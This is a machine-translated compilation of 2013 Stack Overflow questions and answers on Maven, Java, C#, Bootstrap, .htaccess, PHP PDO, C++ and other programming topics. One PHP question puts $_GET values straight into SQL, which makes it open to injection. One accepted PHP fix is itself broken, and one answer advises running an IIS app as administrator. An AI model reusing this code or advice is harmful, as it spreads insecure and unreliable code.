我是一个 maven 新手，目前正在尝试使用 maven 为另一个团队开发的项目设置环境。他们给了我们一个 settings.xml 文件，它没有 localrepository 条目。我把这个文件放在 Maven 安装目录的 conf 文件夹中。当我运行 mvn 包时，我看到资源已下载但无法弄清楚在哪里的消息，我搜索了 m2 目录，甚至尝试将它使用的任何本地存储库 -Dmaven.repo.local 覆盖到 ~/LearningJava/ 但仍然看不到什么被添加到目录中。这是 settings.xml rtp-repo rtp-repo [http://example.com/artifactory/repo中的 repo 条目](http://example.com/artifactory/repo) true never fail true fail 当我尝试给出 -Dmaven.repo.local 选项的绝对路径时，它起作用了。但是我想看看发生了什么，当我没有在命令行和 ~/LearningJava 中设置本地存储库时，它在哪里下载东西？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T20:53:46.230

默认情况下，maven 将下载到 ~/.m2/repository ——也许看那里？

# java - List 和 ArrayList 有什么区别？

> ID：14903145
> 
> 赞同：167
> 
> 时间：2013-02-15T20:52:26.687
> 
> 标签：java, android, list, arraylist

我最近在办公室的 android 项目中一直在使用 ArrayList，我对 List 和 ArrayList 有点困惑，两者有什么区别，我应该使用什么？

我也看到了一些类似的实现。

```
List<SomeObject> myList = new ArrayList<SomeObject>();

ArrayList<SomeObject> myList = new ArrayList<SomeObject>(); 
```

这两个实例有什么区别？

* * *

## 回答 #1

> 赞同：177
> 
> 时间：2013-02-15T20:58:42.593

您的两个示例中的列表实现之间没有区别。但是，您可以在代码中进一步使用变量 myList 的方式有所不同。

当您将列表定义为：

```
List myList = new ArrayList(); 
```

您只能调用 List 接口中定义的方法和引用成员。如果您将其定义为：

```
ArrayList myList = new ArrayList(); 
```

您将能够调用特定于 ArrayList 的方法并使用特定于 ArrayList 的成员，以及那些定义从 List 继承的成员。

然而，当您在第一个示例中调用 List 接口的方法时，该方法在 ArrayList 中实现，来自 ArrayList 的方法将被调用（因为 List 接口没有实现任何方法）。

这叫做多态性。你可以阅读它。

# c# - DownloadString 没有被执行

> ID：14903150
> 
> 赞同：0
> 
> 时间：2013-02-15T20:52:40.783
> 
> 标签：c#, webclient

我是 C#.Net 编程的新手并面临一个问题。当我调用 getLocation 函数时，我总是将“位置”设为空。我知道我做事的方式不对。但是，如果有人可以帮助我以正确的方式做到这一点，那就太好了。我希望 getLocation 函数返回位置值。因此，只有在返回位置值之前执行 wc.downloadString 时，它才应该返回。

```
public String getLocation()
{
    RetrieveFormatedAddress(latitude, longitutde);
    location = returnVal;
    return location;
}

static void RetrieveFormatedAddress(string lat, string lng)
{
    string requestUri = string.Format(baseUri, lat, lng);

    using (WebClient wc = new WebClient())
    {
        wc.DownloadStringCompleted += new DownloadStringCompletedEventHandler(wc_DownloadStringCompleted);
        wc.DownloadString(new Uri(requestUri));
        //wc.DownloadStringAsync(new Uri(requestUri));
    }
}

private static void wc_DownloadStringCompleted(object sender, DownloadStringCompletedEventArgs e)
{
    var xmlElm = XElement.Parse(e.Result);

    var status = (from elm in xmlElm.Descendants()
                  where elm.Name == "status"
                  select elm).FirstOrDefault();
    if (status.Value.ToLower() == "ok")
    {
        var res = (from elm in xmlElm.Descendants()
                   where elm.Name == "formatted_address"
                   select elm).FirstOrDefault();
        returnVal = res.Value;
    }
    else
    {
        returnVal = "No Address Found";
    }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T20:56:33.273

```
public String getLocation()
{
    return RetrieveFormatedAddress(latitude, longitutde);
}

static string RetrieveFormatedAddress(string lat, string lng)
{
    string requestUri = string.Format(baseUri, lat, lng);

    using (WebClient wc = new WebClient())
    {
        var result = wc.DownloadString(new Uri(requestUri));
        var xmlElm = XElement.Parse(result);

        var status = (from elm in xmlElm.Descendants()
              where elm.Name == "status"
              select elm).FirstOrDefault();
        if (status.Value.ToLower() == "ok")
        {
        var res = (from elm in xmlElm.Descendants()
               where elm.Name == "formatted_address"
               select elm).FirstOrDefault();
            return res.Value;
        }
        else
        {
            return "No Address Found";
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T20:58:24.863

该`DownloadString()`方法是方法的同步版本`DownloadStringAsync()`。它将从服务器下载的数据作为字符串返回。在您的代码中，您不会在任何地方读取此值。尝试`var data = wc.DownloadString(new Uri(requestUri));`获取数据。

# twitter-bootstrap - 如何确保在 Bootstrap 中正确设置网格系统？

> ID：14903153
> 
> 赞同：2
> 
> 时间：2013-02-15T20:52:48.357
> 
> 标签：twitter-bootstrap, fluid-layout, grid-layout

我刚刚开始使用 Bootstrap（我以前从未使用过网格系统）并且在理解实现流体网格系统的正确方法时遇到了问题。我有点担心我可能不得不重新设计网站。请查看图片了解更多详情。

**问题 1：**在整个站点周围添加白色边框/填充并且仍然可以缩放的正确方法是什么。我是否必须将它添加到每个新行的开头和结尾，或者是否有更简单的方法来全局应用它？

**问题 2：** 我的一些内容（例如图片滑块的控件）位于页边空白处。这会是一个问题，还是只是通过创建一个包含每列和一些填充的跨度来解决？

**问题 3：**我知道 Bootstrap 有一个默认的 12 列系统，但看起来你可以通过“自定义下载”轻松自定义它。是否像在@gridColumns 字段中输入 14 一样简单，还是我还需要更改 px 宽度？

![](../Images/41cf258c47bd97748bdb0f2731d47ebc.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T00:28:07.250

**问题 1：**一种选择是让 div 包装您的内容，例如：

HTML

```
<div class="wrapper">
    <div class="container">
        // ...
    </div>        
</div> 
```

CSS

```
.wrapper{
    border-right: 4px solid #fff;
    border-left: 4px solid #fff;
} 
```

**问题 2：** 您可以使用类似`margin-left: -20px`的方法将物品推出容器。

**问题 3：** 是的，您可以使用构建器进行自定义，但是，例如，如果您想保留默认的 940 像素宽度，但有 14 列，则您还必须调整列宽变量。

# apache - 阻止 IP 重定向到我的阻止页面

> ID：14903155
> 
> 赞同：1
> 
> 时间：2013-02-15T20:53:00.853
> 
> 标签：apache, .htaccess

我有一个供应商提供的 .htaccess 编辑器，它从我的供应商网站和我的控制面板运行。当我列出要阻止的 IP 时，该方法不允许重定向到我的“被阻止”页面……当然，IP 被阻止了……呵呵。

因此，我研究并找到了另一种在 .htaccess 文件中阻止 IP 的方法。现在使用：

```
RewriteCond %{REMOTE_ADDR} ^98\.137\.207\. [OR]
RewriteCond %{REMOTE_ADDR} ^98\.218\.142\.121 [OR]
RewriteCond %{REMOTE_ADDR} ^99\.33\.36\.101
RewriteCond %{REQUEST_URI} !^/blocked.php$
RewriteRule ^(.*)$ /blocked.php [R] 
```

我被阻止的访问者被重定向到 /blocked.php 页面，他们可以通过电子邮件将其从列表中删除。

问题：这是否比完全阻止它们更不安全......可以访问一个文件允许他们任何黑客访问其他文件，如果它们被完全阻止则无法访问？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T04:18:21.257

简短的回答：是的，它不如一个完整的块安全，但你可以采取措施来减轻它。

如果您首先阻止了它们，我猜您要么怀疑它们，要么将它们识别为试图入侵您的网站或以其他方式行为不端。因此，无论您提供什么让他们请求解除阻塞的访问权限，都应该假设他们没有任何好处。这意味着：

1.  让它成为一个普通的 HTML 页面，而不是一个 php 页面，这更有可能被滥用。
2.  将 HTML 页面放在与主 Web 根目录不同的目录中，以便您可以收紧该目录的规则（不执行脚本、不使用符号链接、更严格的权限等）。
3.  如果通过电子邮件请求解锁，只需列出地址或提供 mailto 链接，不要设置表单，这是另一种恶作剧的途径。

# java - 如何使用 mybatis 从过程调用中返回一个值？

> ID：14903159
> 
> 赞同：2
> 
> 时间：2013-02-15T20:53:38.167
> 
> 标签：java, mybatis

我们使用 myBatis 调用许多存储过程，它们具有我们知道如何处理的 IN / OUT 参数

但是我不知道如何处理程序实际返回值而不是将其声明为 OUT 参数

例如，使用 SQL 编辑器（SQL Server 的 TOAD）我可以运行 proc 并获得返回值，如下所示：

```
DECLARE @return_value int;

EXEC  @return_value = someProcedure 
    @param1 = 'abc',
    @param2 = 12345

SELECT @return_value as N'@Return Value';

GO 
```

但是，我只得到过任何一个结果集的结果，并且不知道如何处理这种情况。我认为这样的事情可能会奏效：

```
<select id="callSomeProcedure" resultType="java.lang.Integer" statementType="CALLABLE">
    { call someProcedure  (
            #{param1},
            #{param2}
    ) }
</select> 
```

但它返回 NULL

有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T21:00:26.083

好的，我知道了

```
<select id="callSomeProcedure" statementType="CALLABLE">
    { #{returnVal} = call someProcedure  (
            #{param1},
            #{param2}
    ) }
</select> 
```

# asp.net - ASP.NET 将 CNAME 添加到 DNS

> ID：14903166
> 
> 赞同：0
> 
> 时间：2013-02-15T20:54:04.717
> 
> 标签：asp.net, security, dns, wmi

我正在尝试将 CNAME 记录添加到 Windows 2k8 上的 MS DNS 服务器，但在 ASP.NET 中运行此代码但在桌面应用程序中运行时出现“通用故障”：

```
 ManagementScope _session = null;

        _session = new ManagementScope("\\\\.\\root\\MicrosoftDNS");
        _session.Connect();

        ManagementClass zoneObj = new ManagementClass(_session, new ManagementPath("MicrosoftDNS_CNAMEType"),null);
        ManagementBaseObject inParams = zoneObj.GetMethodParameters("CreateInstanceFromPropertyData");

        inParams["DnsServerName"] = "xxx.com";
        inParams["ContainerName"] = "xxx.com";
        inParams["OwnerName"] = "test.xxx.com";
        inParams["PrimaryName"] = "en.xxx.com";

        zoneObj.InvokeMethod("CreateInstanceFromTextRepresentation", inParams, null); 
```

似乎问题回到了用户权限，我怎样才能将 **_IUSER 或 ASPNET 发送到 MicrosoftDNS 或其他任何东西来解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T22:12:05.177

您可能必须以管理员用户身份运行 IIS 应用程序。这是一个较旧的页面，其中包含有关执行此操作的信息。[http://www.bluevisionsoftware.com/WebSite/TipsAndTricksDetails.aspx?Name=AspNetAccount](http://www.bluevisionsoftware.com/WebSite/TipsAndTricksDetails.aspx?Name=AspNetAccount)

您可以在 IIS 7.0+ 站点的“基本设置”下更改帐户，然后单击“连接为”。尝试以管理员用户身份运行您的代码，看看它是否有效。

您也可以将代码冒充为其他用户，请参阅[http://support.microsoft.com/kb/306158#4](http://support.microsoft.com/kb/306158#4)

# r - 在 R 中使用子集，但得到一个具有 0 行的特定子集

> ID：14903167
> 
> 赞同：-2
> 
> 时间：2013-02-15T20:54:10.500
> 
> 标签：r

我使用 R 对数据集 D（CSV 格式）进行子集化，但 D3 始终包含 0 行“ **<0 rows>（或 0-length row.names）** ”。我检查了数据集，没有发现任何缺失值。我的数据集可能有什么问题？谢谢！

```
D <- read.csv(file="C:\\...\\D.csv", header = T, sep = ",")

D1 <- subset(D, Season == "Spring")
D2 <- subset(D, Season == "Summer")
D3 <- subset(D, Season == "Fall")

D3
[1] Cost
[2] Gender                                     
[3] Participant                                 
<0 rows> (or 0-length row.names)

names(D)
[1] "Cost"
[2] "Gender"                                     
[3] "Participant"                                    

unique(B$Season)
[1] Spring       Summer    Fall            
3 Levels: Fall Spring Summer 
```

我创建了一个只包含 D3（CSV 格式）的新数据集，问题就消失了。然而，这不是一个有效的解决方案。

感谢大家的所有建议！我只是在我的原始 CSV 数据集中重新输入了每个“Fall”，这在某种程度上起作用了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:30:16.937

在您使用 之前`subset`，您应该检查您正在使用的逻辑语句。如果您的数据框相对较小（< 25 行左右），则运行：

```
D$Season == "Fall" 
```

这会给你一个像这样的向量：

```
[1] TRUE TRUE FALSE FALSE FALSE TRUE 
```

甚至：

```
which(D$Season == "Fall")

[1] 1 2 6 
```

这告诉您`rows`将选择哪个子集。

如果您有一个巨大的数据框，只需执行以下操作：

```
table(D$Season == "Fall") 
```

这将告诉您有多少行具有该值`Fall`。我愿意打赌，如果您运行`table(D$Season == "Fall")`，您会看到所有结果都出现`FALSE`

# generics - 缺少类型约束的泛型数组的总和

> ID：14903174
> 
> 赞同：1
> 
> 时间：2013-02-15T20:54:27.503
> 
> 标签：generics, f#

我正在尝试编写一个简单的数组添加函数。唯一的复杂性来自我试图使其通用的尝试。我知道在 C# 中值类型没有类型约束，但我的理解是 F# 可以使其与[显式成员约束](http://msdn.microsoft.com/en-us/library/dd233203%28v=vs.110%29.aspx)一起工作。这是我的尝试：

```
let Add<'T when 'T : (member (+) : 'T -> 'T -> 'T)> (A : 'T[]) (B : 'T[]) =
    Array.init A.Length (fun i -> A.[i] + B.[i]) 
```

编译器列出了三个错误：一个在 A.[i] 上，一个在 + 号上，一个在 B.[i] 上，但我猜它们都是一样的：

```
A type parameter is missing a constraint 
'when  ^T : (static member ( + ) :  ^T *  ^T ->  ^?6069)' 
```

我确定这只是一个语法问题，谁能指出我正确的地方？

ps：有没有不同/更简单的方法可以做到这一点，或者这是让它工作的正确方法？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-15T20:56:20.927

标记功能`inline`。然后将推断约束。

```
let inline Add (A : 'T[]) (B : 'T[]) =
  Array.init A.Length (fun i -> A.[i] + B.[i]) 
```

你的函数也可以这样写：

```
let inline add a b = Array.map2 (+) a b 
```

编辑

要使约束明确，您可以这样做（看起来很糟糕）

```
let inline Add< ^T when ^T : (static member (+) : ^T * ^T -> ^T) > (A : ^T[]) (B : ^T[]) =
    Array.init A.Length (fun i -> (^T : (static member (+) : ^T * ^T -> ^T) (A.[i], B.[i]))) 
```

但它会产生警告：

> 名称为“op_Addition”的成员约束由 F# 编译器赋予特殊状态，因为某些 .NET 类型隐式地使用此成员进行扩充。如果您尝试从您自己的代码中调用成员约束，这可能会导致运行时失败。

# ios - AnimateWithDuration 运行异常

> ID：14903176
> 
> 赞同：2
> 
> 时间：2013-02-15T20:54:36.340
> 
> 标签：ios, objective-c, xcode, uitextview

出于某种原因，如果我只使用代码：

```
[UIView animateWithDuration:.5 delay:0
                            options:UIViewAnimationOptionCurveEaseInOut
                         animations:^{

                             CGRect newDescriptFrame = [self.summaryTextField frame];
                             newDescriptFrame.size.height = (bkgndRect.size.height - kbSize.height) - ((newDescriptFrame.origin.y) + 10);
                             self.descriptionTextView.frame = newDescriptFrame;

                         }
                         completion:^(BOOL finished){

                         }]; 
```

它移动`descriptionTextView`就好了，但是如果我添加另一个动画块。

```
 [UIView animateWithDuration:.3 delay:.5
                        options:UIViewAnimationOptionCurveEaseInOut
                     animations:^{

                         self.summaryLabel.alpha = 0.0;
                         self.summaryLabel.alpha = 1.0;

                     }
                     completion:^(BOOL finished){}]; 
```

当`descriptionTextView`第二块动画时，它会恢复到动画之前的原始位置。为什么会这样？我如何解决它？如果我将 alpha 更改移动到与帧更改相同的块中。它根本不会为帧更改设置动画。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-03T19:10:32.353

不是因为同一时刻只能执行一个动画吗？也就是说，如果您将两个动画放在一个代码块中，则实际上只会执行最后一个。

# javascript - 网页标记/注释器/荧光笔

> ID：14903177
> 
> 赞同：0
> 
> 时间：2013-02-15T20:54:44.290
> 
> 标签：javascript, html, google-chrome-extension, firefox-addon

有人可以建议一个我可以用来实现以下目标的工具：

![在此处输入图像描述](../Images/8ea8cc22899c66e93d7b3c93645adea7.png)

基本上，我需要用一个矩形将感兴趣的文本括起来，并在附近写一个标签。

我不确定我们应该如何称呼这种工具。我尝试了标题中的关键字，但未能找到适合浏览器的扩展或附加组件，这是首选。其他简单易用的工具也可以。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:12:42.730

一些屏幕截图工具具有该功能；例如[**Awesome Screenshot**](https://chrome.google.com/webstore/detail/awesome-screenshot-captur/alelhddbbhepgpmgidjdcjakblofbmce?hl=en) Chrome 扩展。

![在此处输入图像描述](../Images/1d6a49fff11348431a1706116887f956.png)

这里的关键词可能是“Screenshot”和“Annotator”。

# ruby - 使用模拟数据填充数据库

> ID：14903179
> 
> 赞同：1
> 
> 时间：2013-02-15T20:54:51.753
> 
> 标签：ruby, ruby-on-rails-3.2

我正在编写一个 Rake 任务，用他们给我的一些模拟数据填充数据库，例如，如果有一个包含名称、id 和 time_zone 字段的组织表，我想在我的 rake 任务中填充它，所以首先，我创建了一组示例组织：

```
SAMPLE_ORGANIZATIONS = [ '37 Signals', 'Fog Creek'] 
```

然后是一种从中填充数据库的方法：

```
def create_organizations
  SAMPLE_ORGANIZATIONS.each_with_index  {|item, index|
    Organization.first_or_create(
        name: item,
        time_zone: 'Central'
    )
  }
end 
```

这是一个好方法吗？我该如何改进它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:03:12.977

有几个选项。

1.  将你的模拟代码放在 db/seeds.rb 中，然后运行`rake db:seed`

2.  夹具。在 yaml 文件中定义数据，然后运行`rake db:fixtures:load`​​.

3.  工厂女工。可能是最好的选择，但稍微复杂一些。将您的 FactoryGirl 代码放入 db/seeds.rb 并像 #1 一样使用它。

# tfs - TFS 2012 在组成员身份下添加成员禁用

> ID：14903185
> 
> 赞同：2
> 
> 时间：2013-02-15T20:55:20.077
> 
> 标签：tfs, member, membership

我正在使用 TFS 2012 服务器管理控制台来管理不同团队项目的组成员身份。但是，似乎在最近的更新（TFS 更新 1 / 大量 Windows 更新）之后，我无法在任何组下添加成员。这可能无关，但我没有对系统进行任何其他修改。

![禁用“添加成员”部分](../Images/6fde9199eda5ee9a9e1d1852ce6ea513.png)

整个添加成员部分被禁用，我不知道为什么。我一直在使用相同的 Windows 管理员帐户登录时使用此功能。

操作系统是 Windows Server 2012。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T02:29:00.457

TFSUpdate1 存在一些与安全相关的问题。请参阅[知识库文章](http://support.microsoft.com/kb/2803625?wa=wsignin1.0)并[应用补丁](http://www.microsoft.com/en-us/download/details.aspx?id=36392)

# jquery - 如何优化这个 jquery 脚本？

> ID：14903186
> 
> 赞同：-1
> 
> 时间：2013-02-15T20:55:19.990
> 
> 标签：jquery, optimization, click

我是一个 jquery“菜鸟”，我需要一点澄清......我有这个表格

```
<form id="myform">
    <div id="sectionA">
       <button id="button1">
    </div>
    <div id="sectionB">
       <button id="button2">
    </div>
    <div id="sectionC">
       <button id="button3">
    </div>
 </form> 
```

要触发我所做的每个按钮的点击

```
$("#button1").click(function() { $("#myform").submit(); });
$("#button2").click(function() { $("#myform").submit(); });
$("#button3").click(function() { $("#myform").submit(); }); 
```

我怎样才能只编写一个函数而不重复 3 次相同的代码？谢谢克里斯

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T20:57:02.597

您可以使用一个选择器选择多个 ID。

```
$('#button1, #button2, #button3').click(function() {
    $('#myform').submit();
}); 
```

但是，这可能会变得笨拙，因此我建议您对想要具有此行为的按钮使用类。

```
<button class="clickable"></button>

$('.clickable').click(function() {
    $('#myform').submit();
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-15T20:57:25.827

```
$('button').click($('form').submit); 
```

# zend-framework2 - 所有 ViewModel 中的用户身份

> ID：14903188
> 
> 赞同：3
> 
> 时间：2013-02-15T20:55:27.497
> 
> 标签：zend-framework2

我`Zend\Authentication\AuthenticationService`用来管理当前登录的用户。现在我希望实体对象默认在所有 ViewModel 中可用，而不必在每个控制器操作中分配用户对象。

有没有很好的方法来做到这一点？还是我需要为 ViewModels 创建一个工厂并从那里注入用户的身份？在那种情况下，每次我想创建一个 ViewModel 时，我都必须使用 ServiceManager，这不是很性感。

有没有更优雅的方式？我可以以某种方式直接从 ViewModel（即模板）中访问 AuthenticationService 吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-16T02:09:57.977

受到 Ocramius 和 Bram 答案的启发，我深入研究了 ZF View Helpers。tadaa：事实证明，**ZF2 已经带有一个 Helper 来访问**任何 View Model 中的用户身份。View Helper 简称为`identity`。

为了让它工作，你需要添加`Zend\Authentication\AuthenticationService`到可调用类的列表中（不知道，为什么这不是默认的），例如在你的*config/autoload/global.php*中：

```
return array(
    'service_manager' => array(
        'invokables' => array(
            'Zend\Authentication\AuthenticationService' => 'Zend\Authentication\AuthenticationService',
        ),
    ),
); 
```

之后，您可以轻松地从任何模板访问当前用户的身份：

```
<p>Hello <?php echo $this->identity()->getName() ?></p> 
```

再次感谢 Ocramius 让我走上正轨！如果您不使用 Zend\Authentication\AuthenticationService 他的回答仍然适用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-15T22:16:54.570

看看它是怎么[`ZfcUser`](https://github.com/ZF-Commons/ZfcUser)做的。[它允许视图助手](https://github.com/ZF-Commons/ZfcUser/blob/0.1.0/src/ZfcUser/View/Helper/ZfcUserIdentity.php)访问身份验证服务，而不是在所有视图中注入身份变量。

为此，身份验证服务[通过服务工厂](https://github.com/ZF-Commons/ZfcUser/blob/0.1.0/Module.php#L62-L67)注入到视图助手中。

这基本上允许您在任何视图脚本中使用类似以下的内容：

```
echo $user = $this->zfcUserIdentity();

echo $user ? $user->getUsername() : 'Not logged in!'; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-15T22:15:48.223

您应该创建一个视图助手，从身份验证服务中检索用户模型。以 ZfcUser[视图助手](https://github.com/ZF-Commons/ZfcUser/blob/master/src/ZfcUser/View/Helper/ZfcUserIdentity.php)为例。也许您可以将 ZfcUser 模块用于您的用例。

# php - 致命 PDO 错误：不能将 PDOStatement 类型的对象用作数组

> ID：14903191
> 
> 赞同：-1
> 
> 时间：2013-02-15T20:55:54.633
> 
> 标签：php, mysql, sql, pdo

我在尝试运行它时遇到了一个致命错误，我不知道为什么。错误是：

致命错误：不能在第 22 行的 C:\xxx.php 中使用 PDOStatement 类型的对象作为数组

第 22 行是行

```
if($resultaat['poop'] == 0){ 
```

这是完整的代码

```
if ($db <> NULL) {

        $sql = "SELECT COUNT(leerlingen.bestemming) AS someVar FROM leerlingen, bestemmingen 
        WHERE leerlingen.bestemming = (SELECT bestemming FROM bestemmingen WHERE bestemmingsnummer =  $_GET[bestemmingsnummer]) ";
        $resultaat = $db->query($sql);

        if($resultaat['someVar'] == 0){

            echo '<script type="text/javascript">'; 
            echo 'alert("true.")'; 
            echo '</script>';
//              $sql = "DELETE FROM bestemmingen WHERE bestemmingsnummer =      $_GET[bestemmingsnummer]";
//              $resultaat = $db->exec($sql);
        }
        else{
            echo '<script type="text/javascript">'; 
            echo 'alert("false")'; 
            echo '</script>';  
        }

} 
```

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T20:57:26.063

您需要先获取结果：

```
[...]
$db->query($sql);
$resultaat = $db->fetch(PDO::FETCH_ASSOC);   

if($resultaat['someVar'] == 0){
[...] 
```

# asp.net - asp.net c# 数据库

> ID：14903195
> 
> 赞同：0
> 
> 时间：2013-02-15T20:56:08.297
> 
> 标签：asp.net

我将在我的网站上创建一个评论部分，我想将 using 用于我的数据库设置，如下面的代码。那是正确的代码还是？我的英语不太好，但我尽量解释我们可以。

代码将在 btnSend

```
 using () {
         //Insert the data to the database

        }

  using () {
         //Select  the data from the datbase and the display it 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:11:42.120

我会编写两种单独的方法，一种用于插入，一种用于显示。

```
protected void insert ()
          {
            /// insert here 
           }
 protected void display()
          {
            ///display logic here 
           }
  btnSend_click ( blah blah)
        {
          insert();
          display();
         } 
```

类似的事情是我一直做的。这是你问的吗？

# php - 用其他立方体/棱镜构建一个立方体/矩形棱镜？

> ID：14903196
> 
> 赞同：0
> 
> 时间：2013-02-15T20:56:11.147
> 
> 标签：php, algorithm, math, geometry

我想知道，是否存在任何算法或理论（未获得专利/专有/受保护）将采用一系列 3d 矩形棱镜（或立方体，但立方体是棱镜）并以这种方式堆叠它们当它们形成另一个立方体或以最佳格式组合在一起时？

我正在开发工作中的物流软件，这可能是一个有趣的功能。

如果还没有可供我查看和研究的算法，我也会接受讨论此理论的好文章。

# c++ - 函数“stof”无法解析

> ID：14903198
> 
> 赞同：7
> 
> 时间：2013-02-15T20:56:15.963
> 
> 标签：c++, c++11, mingw

我之前遇到过这个问题，但找到了解决方法，只是这次没有解决方法。

我正在尝试使用 'stof' 函数，但我收到错误消息：'stof' is not a member of 'std' Function 'stof' could not besolved

如果在此页面上显示，我会以确切的方式使用它：[http ://www.cplusplus.com/reference/string/stof/](http://www.cplusplus.com/reference/string/stof/)

这是我的包括：

```
#include <iostream>
#include <sstream>
#include <string>
using namespace std; 
```

那么，我做错了什么？如果找不到解决方案，是否有人可以指出另一种将字符串转换为浮点数的方法，如果字符串不兼容，它会抛出异常吗？

编辑：使用示例程序和错误进行更新。

```
#include <iostream>
#include <sstream>
#include <string>
using namespace std;

int main()
{
   string testString = "";
   float testFloat = 0.0;
   testFloat = std::stof(testString);

   return 0;
} 
```

我得到的错误是：

说明 资源路径位置类型“stof”不是“std”的成员 main.cpp /Assignment/src 第 33 行 C/C++ 问题

说明资源路径位置类型函数“stof”无法解析 main.cpp /Assignment/src 第 33 行语义错误

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-02-15T21:00:00.970

[stof](http://en.cppreference.com/w/cpp/string/basic_string/stof)是一个 C++11 函数。确保您的编译器支持它（目前还没有编译器完全支持 C++11，尽管目前大多数现代编译器都支持相当大的子集）。

例如，在 g++ 上，您必须使用`-std=c++11`选项 ( `std=c++0x`pre g++-4.7) 启用它。

如果您使用的是 g++，请检查您使用的是哪个版本`g++ -v`- 如果它是旧版本（例如 4.2），c++11 功能将不可用。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-02-15T21:38:24.177

你使用`stof`正确。这是 gcc 4.7.2 的 MinGW 构建中的一个[已知错误](http://gcc.gnu.org/bugzilla/show_bug.cgi?id=52015)。它应该为 gcc 4.8 修复。SO上有很多将字符串转换为数字的示例。这是[一个](https://stackoverflow.com/q/4669311/46821)。您必须自己动手来获得所需的异常行为，但这些示例应该可以帮助您入门。

# sitecore - Sitecore 异常处理策略（类似于 Entlib）

> ID：14903203
> 
> 赞同：0
> 
> 时间：2013-02-15T20:56:43.453
> 
> 标签：sitecore, sitecore6

我一直在寻找关于 sitecore 是否支持基于策略（如 Entlib）异常处理和日志记录的单篇文章。

有人可以帮助我正确的方向，是否可以使用最新的sitecore？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:27:51.757

Sitecore itself doesn't have a policy based exception handling mechanism in the same sense as Entlib. That said there is nothing stopping you introducing Entlib policy based exception handling into your Sitecore website as it is still just a regular ASP.NET web application. You can make calls to ExceptionPolicy.HandleException where ever you would normally trap and respond to thrown exceptions in your code.

To get started take a look at the John West post [Error Management with the Sitecore ASP.NET CMS](http://www.sitecore.net/Community/Technical-Blogs/John-West-Sitecore-Blog/Posts/2011/09/Error-Management-with-the-Sitecore-ASPNET-CMS.aspx) and also give some consideration to adding an Application level error handler that applies the Entlib policy that you've setup.

# html - 更改 Bootstrap 的表单颜色

> ID：14903205
> 
> 赞同：13
> 
> 时间：2013-02-15T20:56:51.150
> 
> 标签：html, css, twitter-bootstrap

我的 Bootstrap 站点中有一个简单的表单，但是我想要灰色背景上的白色文本，而不是白色背景上的基本灰色文本。我能够处理灰色背景，但我似乎无法更改占位符或输入文本颜色。

一个小小的[JSFiddle](http://jsfiddle.net/cUvWM/)动作。

这是我的 HTML 标记：

```
<div class="span6" id="email-form">
    <form name="contact-form" id="contact-form" method="post" action="form-processing.php">
        <input class="span6" name="Name" id="Fname" type="text" placeholder="Your name" required>
        <input class="span6" name="Email" id="Email" type="email" placeholder="Your email" required>
        <textarea class="span6" name ="Message" id="Message" type="text" rows="10" placeholder="What services will you be requiring?" required></textarea><br>
        <button type="submit" class="btn btn-primary">Send</button>
        <button type="clear" class="btn">Clear</button>
    </form><!--/.span6-->
</div><!--/#email-form--> 
```

这是我尝试过的 CSS，背景颜色更改有效，但占位符或文本无效。

```
#Email, #Fname, #Message{
    background-color:#666;
}
#Email placeholder, #Fname placeholder, #Message placeholder{
    color:#FFF;
}
#Fname text{
    color:#FFF;
} 
```

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-02-15T21:25:47.537

I think this is the CSS you're looking for:

```
input, textarea{
    background-color:#666;
    color: #FFF;
} 
```

If you want to make the place holder text a color other than #FFF you can use the following CSS and update the color:

```
::-webkit-input-placeholder { /* WebKit browsers */
    color:    #FFF;
}
:-moz-placeholder { /* Mozilla Firefox 4 to 18 */
    color:    #FFF;
}
::-moz-placeholder { /* Mozilla Firefox 19+ */
    color:    #FFF;
}
:-ms-input-placeholder { /* Internet Explorer 10+ */
    color:    #FFF;
} 
```

Here's a fork of your [jsFiddle](http://jsfiddle.net/4FaQu/1/)

Thanks @Ben Felda for the link.

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2015-11-11T17:24:55.517

我知道问题是关于将类放在默认的 Bootstrap css 上，但对于那些从源代码编译 Bootstrap 的人，您可以通过更改以下`bootstrap/variables.less`文件中的一些变量来做到这一点`//== Forms`。

```
//== Forms
//
//##

//** `<input>` background color
$input-bg:                       $gray;

//** Text color for `<input>`s
$input-color:                    #fff;

//** Placeholder text color
$input-placeholder-color:        #fff;  // You probably want this to be a little different color. Maybe #999; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-15T22:05:26.427

```
#Email, #Fname {
    background-color:#666;
}
input, textarea{
    background-color:#666;
    color: #FFF;
}
::-webkit-input-placeholder { /* WebKit browsers */
    color: #FFF;
}
:-moz-placeholder { /* Mozilla Firefox 4 to 18 */
    color: #FFF;
}
::-moz-placeholder { /* Mozilla Firefox 19+ */
    color: #FFF;
}
:-ms-input-placeholder { /* Internet Explorer 10+ */
    color: #FFF;
}
input::-webkit-input-placeholder, textarea::-webkit-input-placeholder {
    color: #FFF;
}
input:-moz-placeholder, textarea:-moz-placeholder {
    color: #FFF;
} 
